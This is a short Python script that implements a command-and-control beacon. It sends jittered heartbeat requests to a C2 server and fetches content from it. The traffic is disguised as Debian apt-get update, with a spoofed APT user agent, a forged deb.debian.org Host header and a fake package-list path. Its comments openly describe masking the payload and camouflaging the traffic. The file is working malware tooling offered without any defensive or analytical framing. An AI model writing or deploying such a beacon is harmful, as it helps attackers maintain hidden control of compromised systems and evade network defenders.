import requests
import time
import random

class Conversation:
    def __init__(self, c2_url):
        self.c2_url = c2_url
        self.user_agent = "Debian APT-HTTP/1.3 (2.2.4) non-interactive"

    def send_heartbeat(self):
        # Mimic apt-get update traffic
        jitter = random.uniform(5, 15)
        time.sleep(jitter)

        headers = {
            "User-Agent": self.user_agent,
            "Accept": "text/plain, text/html",
            "Host": "deb.debian.org"
        }

        try:
            # Masking payload in a seemingly benign GET request for a package list
            response = requests.get(f"{self.c2_url}/debian/dists/bullseye/main/binary-amd64/Packages.gz", headers=headers)
            return response.content
        except:
            return None

if __name__ == "__main__":
    conv = Conversation("http://c2-dev-server.local")
    print("Conversation started. Camouflaging as apt update...")
